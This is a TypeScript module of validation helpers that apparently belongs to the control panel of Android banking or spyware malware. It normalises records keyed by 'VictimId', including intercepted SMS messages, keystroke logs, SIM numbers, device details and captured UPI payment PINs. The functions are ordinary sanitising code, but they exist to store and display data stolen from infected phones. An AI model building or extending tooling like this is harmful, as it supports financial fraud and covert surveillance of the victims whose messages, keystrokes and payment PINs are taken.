import { DeviceInfo, Message, SimRow, KeyLog } from '@/data/db';

// Data validation utilities to prevent data loss
export const validateDeviceInfo = (device: any): DeviceInfo | null => {
  if (!device || typeof device !== 'object') return null;
  
  return {
    Status: device.Status || 'Unknown',
    AndroidVersion: device.AndroidVersion || 'Unknown',
    IPAddress: device.IPAddress || 'Unknown',
    UPIPin: device.UPIPin || 'No Pin',
    Note: device.Note || '',
    Added: device.Added || new Date().toISOString(),
    AppsInstalled: device.AppsInstalled || '0',
    Battery: device.Battery || '100%',
    Brand: device.Brand || 'Unknown',
    Model: device.Model || 'Unknown'
  };
};

export const validateMessage = (message: any): Message | null => {
  if (!message || typeof message !== 'object') return null;
  if (!message.VictimId || !message.Sender || !message.Time) return null;
  
  return {
    VictimId: message.VictimId,
    Sender: message.Sender,
    Time: message.Time,
    Body: message.Body || '',
    SmsType: message.SmsType || 'UNKNOWN'
  };
};

export const validateSimRow = (sim: any): SimRow | null => {
  if (!sim || typeof sim !== 'object') return null;
  
  return {
    slot: sim.slot || 0,
    carrier: sim.carrier || 'Unknown',
    number: sim.number || 'Unknown'
  };
};

export const validateKeyLog = (log: any): KeyLog | null => {
  if (!log || typeof log !== 'object') return null;
  if (!log.time || !log.text) return null;
  
  return {
    time: log.time,
    text: log.text
  };
};

// Batch validation functions
export const validateDevices = (devices: any): Record<string, DeviceInfo> => {
  if (!devices || typeof devices !== 'object') return {};
  
  const validated: Record<string, DeviceInfo> = {};
  
  for (const [id, device] of Object.entries(devices)) {
    const validDevice = validateDeviceInfo(device);
    if (validDevice) {
      validated[id] = validDevice;
    }
  }
  
  return validated;
};

export const validateMessages = (messages: any): Record<string, Message> => {
  if (!messages || typeof messages !== 'object') return {};
  
  const validated: Record<string, Message> = {};
  
  for (const [id, message] of Object.entries(messages)) {
    const validMessage = validateMessage(message);
    if (validMessage) {
      validated[id] = validMessage;
    }
  }
  
  return validated;
};

export const validateSims = (sims: any[]): SimRow[] => {
  if (!Array.isArray(sims)) return [];
  
  return sims
    .map(validateSimRow)
    .filter((sim): sim is SimRow => sim !== null);
};

export const validateKeyLogs = (logs: any[]): KeyLog[] => {
  if (!Array.isArray(logs)) return [];
  
  return logs
    .map(validateKeyLog)
    .filter((log): log is KeyLog => log !== null);
};

export const validateUPIPins = (pins: any): string[] => {
  if (!Array.isArray(pins)) return [];
  
  return pins
    .filter(pin => typeof pin === 'string' && pin.length > 0)
    .map(pin => String(pin));
};
